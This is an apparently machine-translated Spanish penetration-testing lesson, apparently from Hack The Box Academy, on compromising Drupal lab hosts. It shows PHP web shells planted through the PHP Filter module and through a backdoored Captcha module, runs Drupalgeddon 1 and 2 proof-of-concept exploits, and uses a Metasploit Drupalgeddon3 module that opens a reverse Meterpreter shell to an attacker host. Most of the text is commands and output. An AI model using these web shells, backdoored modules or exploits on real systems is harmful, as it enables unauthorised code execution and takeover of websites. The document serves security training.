# Attacking Drupal

Ahora que hemos confirmado que nos enfrentamos a Drupal y hemos hecho las huellas digitales de la versión y veamos qué configuraciones erróneas y vulnerabilidades podemos descubrir para intentar obtener acceso interno a la red.

A diferencia de algunos CMS ', obtener un shell en un host de Drupal a través de la consola de administración no es tan fácil como solo editar un archivo PHP que se encuentra dentro de un tema o cargar un script PHP malicioso.

---

# **Aprovechando el módulo de filtro PHP**

En versiones anteriores de Drupal (antes de la versión 8), era posible iniciar sesión como administrador y habilitar el`PHP filter`Módulo, que "permite evaluar el código/fragmentos PHP integrado".

![](https://academy.hackthebox.com/storage/modules/113/drupal_php_module.png)

Desde aquí, podríamos marcar la casilla de verificación al lado del módulo y desplazarnos hacia abajo hasta`Save configuration`. A continuación, podríamos ir al contenido -> Agregar contenido y crear un`Basic page`.

![](https://academy.hackthebox.com/storage/modules/113/basic_page.png)

Ahora podemos crear una página con un fragmento de PHP malicioso como el siguiente. Llamamos el parámetro con un hash MD5 en lugar del común`cmd`Para entrar en la práctica de no dejar una puerta abierta a un atacante durante nuestra evaluación. Si usamos el estándar`system($_GET['cmd']);`Nos abrimos a un atacante de "conducir" que potencialmente se encuentra con nuestro shell web. Aunque es poco probable, ¡mejor seguro que curar!

Código:php

```php
<?phpsystem($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```

![](https://academy.hackthebox.com/storage/modules/113/basic_page_shell_7v2.png)

También queremos asegurarnos de establecer`Text format`desplegable a`PHP code`. Después de hacer clic en Guardar, seremos redirigidos a la nueva página, en este ejemplo`http://drupal-qa.inlanefreight.local/node/3`. Una vez guardado, podemos solicitar comandos de ejecución en el navegador agregando`?dcfdd5e021a869fcc6dfaef8bf31377e=id`Al final de la URL para ejecutar el`id`comandar o usar`cURL`en la línea de comando. Desde aquí, podríamos usar una línea de una línea de una línea para obtener acceso a la carcasa inversa.

Atacando a Drupal

```
xnoxos@htb[/htb]$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

Desde la versión 8 en adelante, el[Filtro PHP](https://www.drupal.org/project/php/releases/8.x-1.1)El módulo no está instalado de forma predeterminada. Para aprovechar esta funcionalidad, tendríamos que instalar el módulo nosotros mismos. Como estaríamos cambiando y agregando algo a la instancia de Drupal del cliente, es posible que deseemos consultar con ellos primero. Comenzaríamos descargando la versión más reciente del módulo desde el sitio web de Drupal.

Atacando a Drupal

```
xnoxos@htb[/htb]$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

Una vez descargado, vaya a`Administration` > `Reports` > `Available updates`.

Nota: La ubicación puede diferir según la versión Drupal y puede estar en el menú Extender.

![](https://academy.hackthebox.com/storage/modules/113/install_module.png)

Desde aquí, haga clic en`Browse,`Seleccione el archivo del directorio al que lo descargamos y luego haga clic en`Install`.

Una vez que se instala el módulo, podemos hacer clic en`Content`y cree una nueva página básica, similar a cómo lo hicimos en el ejemplo de Drupal 7. De nuevo, asegúrese de seleccionar`PHP code`desde`Text format`desplegable.

Con cualquiera de estos ejemplos, debemos mantener a nuestro cliente informado y obtener permiso antes de hacer este tipo de cambios. Además, una vez que hayamos terminado, debemos eliminar o deshabilitar el`PHP Filter`Módulo y elimine las páginas que creamos para obtener la ejecución de código remoto.

---

# **Subiendo un módulo trasero**

Drupal permite a los usuarios con permisos apropiados cargar un nuevo módulo. Se puede crear un módulo trasero agregando un shell a un módulo existente. Los módulos se pueden encontrar en el sitio web Drupal.org. Elegamos un módulo como[Captcha](https://www.drupal.org/project/captcha). Desplácese hacia abajo y copie el enlace para el tar.gz[archivo](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

Descargue el archivo y extraiga su contenido.

Atacando a Drupal

```
xnoxos@htb[/htb]$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gzxnoxos@htb[/htb]$ tar xvf captcha-8.x-1.2.tar.gz
```

Cree un shell web PHP con el contenido:

Código:php

```php
<?phpsystem($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);
?>
```

A continuación, necesitamos crear un archivo .htaccess para darnos acceso a la carpeta. Esto es necesario ya que Drupal niega el acceso directo a la carpeta /módulos.

Código:html

```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

La configuración anterior aplicará reglas para la carpeta / cuando solicitemos un archivo en / módulos. Copie ambos archivos a la carpeta Captcha y cree un archivo.

Atacando a Drupal

```
xnoxos@htb[/htb]$ mv shell.php .htaccess captchaxnoxos@htb[/htb]$ tar cvf captcha.tar.gz captcha/captcha/
captcha/.travis.yml
captcha/README.md
captcha/captcha.api.php
captcha/captcha.inc
captcha/captcha.info.yml
captcha/captcha.install

<SNIP>

```

Suponiendo que tengamos acceso administrativo al sitio web, haga clic en`Manage`y luego`Extend`en la barra lateral. A continuación, haga clic en el`+ Install new module`botón, y seremos llevados a la página de instalación, como`http://drupal.inlanefreight.local/admin/modules/install`Navegar al archivo de captcha de trasero y haga clic`Install`.

![](https://academy.hackthebox.com/storage/modules/113/module_installed.png)

Una vez que la instalación tenga éxito, navegue a`/modules/captcha/shell.php`para ejecutar comandos.

Atacando a Drupal

```
xnoxos@htb[/htb]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=iduid=33(www-data) gid=33(www-data) groups=33(www-data)

```

---

# **Aprovechando vulnerabilidades conocidas**

Con los años, Drupal Core ha sufrido algunas vulnerabilidades de ejecución de código remoto serios, cada una doblada`Drupalgeddon`. Al momento de escribir, existen 3 vulnerabilidades Drupalgeddon.

- [CVE-2014-3704](https://www.drupal.org/SA-CORE-2014-005), conocido como Drupalgeddon, afecta las versiones 7.0 hasta 7.31 y se solucionó en la versión 7.32. Este fue un defecto de inyección SQL preautenticado que podría usarse para cargar una forma maliciosa o crear un nuevo usuario administrativo.
- [CVE-2018-7600](https://www.drupal.org/sa-core-2018-002), también conocido como DrupalgedDon2, es una vulnerabilidad de ejecución de código remoto, que afecta las versiones de Drupal antes de 7.58 y 8.5.1. La vulnerabilidad ocurre debido a la desinfección insuficiente de la entrada durante el registro del usuario, lo que permite que los comandos a nivel del sistema se inyecten maliciosamente.
- [CVE-2018-7602](https://cvedetails.com/cve/CVE-2018-7602/), también conocido como DrupalgedDon3, es una vulnerabilidad de ejecución de código remoto que afecta a múltiples versiones de Drupal 7.x y 8.x. Esta falla explota la validación inadecuada en la API de formulario.

Caminemos explotando cada uno de estos.

---

# **Drupalgeddon**

Como se indicó anteriormente, este defecto puede explotarse aprovechando una inyección SQL previa a la autorización que puede usarse para cargar código malicioso o agregar un usuario administrador. Intentemos agregar un nuevo usuario administrativo con este[POC](https://www.exploit-db.com/exploits/34992)guion. Una vez que se agrega un usuario administrador, podríamos iniciar sesión y habilitar el`PHP Filter`Módulo para lograr la ejecución del código remoto.

Ejecutando el script con el`-h`La bandera nos muestra el menú de ayuda.

Atacando a Drupal

```
xnoxos@htb[/htb]$ python2.7 drupalgeddon.py   ______                          __     _______  _______ _____
 |   _  \ .----.--.--.-----.---.-|  |   |   _   ||   _   | _   |
 |.  |   \|   _|  |  |  _  |  _  |  |   |___|   _|___|   |.|   |
 |.  |    |__| |_____|   __|___._|__|      /   |___(__   `-|.  |
 |:  1    /          |__|                 |   |  |:  1   | |:  |
 |::.. . /                                |   |  |::.. . | |::.|
 `------'                                 `---'  `-------' `---'
  _______       __     ___       __            __   __
 |   _   .-----|  |   |   .-----|__.-----.----|  |_|__.-----.-----.
 |   1___|  _  |  |   |.  |     |  |  -__|  __|   _|  |  _  |     |
 |____   |__   |__|   |.  |__|__|  |_____|____|____|__|_____|__|__|
 |:  1   |  |__|      |:  |    |___|
 |::.. . |            |::.|
 `-------'            `---'

                                 Drup4l => 7.0 <= 7.31 Sql-1nj3ct10n
                                              Admin 4cc0unt cr3at0r

			  Discovered by:

			  Stefan  Horst
                         (CVE-2014-3704)

                           Written by:

                         Claudio Viviani

                      http://www.homelab.it

                         info@homelab.it
                     homelabit@protonmail.ch

                 https://www.facebook.com/homelabit
                   https://twitter.com/homelabit
                 https://plus.google.com/+HomelabIt1/
       https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww

Usage: drupalgeddon.py -t http[s]://TARGET_URL -u USER -p PASS

Options:
  -h, --help            show this help message and exit
  -t TARGET, --target=TARGET
                        Insert URL: http[s]://www.victim.com
  -u USERNAME, --username=USERNAME
                        Insert username
  -p PWD, --pwd=PWD     Insert password

```

Aquí vemos que necesitamos proporcionar la URL de destino y un nombre de usuario y contraseña para nuestra nueva cuenta de administración. Ejecutemos el script y veamos si obtenemos un nuevo usuario administrador.

Atacando a Drupal

```
xnoxos@htb[/htb]$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd<SNIP>

[!] VULNERABLE!

[!] Administrator user created!

[*] Login: hacker
[*] Pass: pwnd
[*] Url: http://drupal-qa.inlanefreight.local/?q=node&destination=node

```

Ahora veamos si podemos iniciar sesión como administrador. ¡Podemos! Ahora a partir de aquí, podríamos obtener un caparazón a través de los diversos medios discutidos anteriormente en esta sección.

![](https://academy.hackthebox.com/storage/modules/113/drupalgeddon.png)

También podríamos usar el[Exploit/multi/http/drupal_druPageddon](https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/)Módulo de metasploit para explotar esto.

---

# **Drupalgeddon2**

Podemos usar[este](https://www.exploit-db.com/exploits/44448)POC para confirmar esta vulnerabilidad.

Atacando a Drupal

```
xnoxos@htb[/htb]$ python3 drupalgeddon2.py################################################################# Proof-Of-Concept for CVE-2018-7600# by Vitalii Rudnykh# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders# https://github.com/a2u/CVE-2018-7600################################################################Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/hello.txt

```

Podemos verificar rápidamente con`cURL`y ver que el`hello.txt`El archivo se cargó de hecho.

Atacando a Drupal

```
xnoxos@htb[/htb]$ curl -s http://drupal-dev.inlanefreight.local/hello.txt;-)

```

Ahora modificemos el script para obtener la ejecución del código remoto cargando un archivo PHP malicioso.

Código:php

```php
<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
```

Atacando a Drupal

```
xnoxos@htb[/htb]$ echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K

```

A continuación, reemplacemos el`echo`Comando en el script de explotación con un comando para escribir nuestro script PHP malicioso.

Atacando a Drupal

```
 echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php

```

A continuación, ejecute el script de exploit modificado para cargar nuestro archivo PHP malicioso.

Atacando a Drupal

```
xnoxos@htb[/htb]$ python3 drupalgeddon2.py################################################################# Proof-Of-Concept for CVE-2018-7600# by Vitalii Rudnykh# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders# https://github.com/a2u/CVE-2018-7600################################################################Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/mrb3n.php

```

Finalmente, podemos confirmar la ejecución del código remoto usando`cURL`.

Atacando a Drupal

```
xnoxos@htb[/htb]$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=iduid=33(www-data) gid=33(www-data) groups=33(www-data)

```

---

# **Drupalgeddon3**

[Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3)es una vulnerabilidad de ejecución de código remoto autenticado que afecta[múltiples versiones](https://www.drupal.org/sa-core-2018-004)de núcleo drupal. Requiere que un usuario tenga la capacidad de eliminar un nodo. Podemos explotar esto usando Metasploit, pero primero debemos iniciar sesión y obtener una cookie de sesión válida.

![](https://academy.hackthebox.com/storage/modules/113/burp.png)

Una vez que tenemos la cookie de la sesión, podemos configurar el módulo de exploit de la siguiente manera.

Atacando a Drupal

```
msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
msf6 exploit(multi/http/drupal_drupageddon3) > show options

Module options (exploit/multi/http/drupal_drupageddon3):

   Name            Current Setting                                                                   Required  Description
   ----            ---------------                                                                   --------  -----------
   DRUPAL_NODE     1                                                                                 yes       Exist Node Number (Page, Article, Forum topic, or a Post)
   DRUPAL_SESSION  SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y  yes       Authenticated Cookie Session
   Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          10.129.42.195                                                                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT           80                                                                                yes       The target port (TCP)
   SSL             false                                                                             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI       /                                                                                 yes       The target URI of the Drupal installation
   VHOST           drupal-acc.inlanefreight.local                                                    no        HTTP server virtual host

Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   User register form with exec

```

Si tiene éxito, obtendremos una carcasa inversa en el host de destino.

Atacando a Drupal

```
msf6 exploit(multi/http/drupal_drupageddon3) > exploit

[*] Started reverse TCP handler on 10.10.14.15:4444
[*] Token Form -> GH5mC4x2UeKKb2Dp6Mhk4A9082u9BU_sWtEudedxLRM
[*] Token Form_build_id -> form-vjqTCj2TvVdfEiPtfbOSEF8jnyB6eEpAPOSHUR2Ebo8
[*] Sending stage (39264 bytes) to 10.129.42.195
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:44612) at 2021-08-24 12:38:07 -0400

meterpreter > getuid

Server username: www-data (33)

meterpreter > sysinfo

Computer    : app01
OS          : Linux app01 5.4.0-81-generic#91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64Meterpreter : php/linux

```

---

# **Adelante**

Hemos enumerado y atacado algunos de los CM más frecuentes: WordPress, Drupal y Joomla. A continuación, pasemos a Tomcat, que ha estado poniendo una sonrisa en la cara de Pentesters durante años.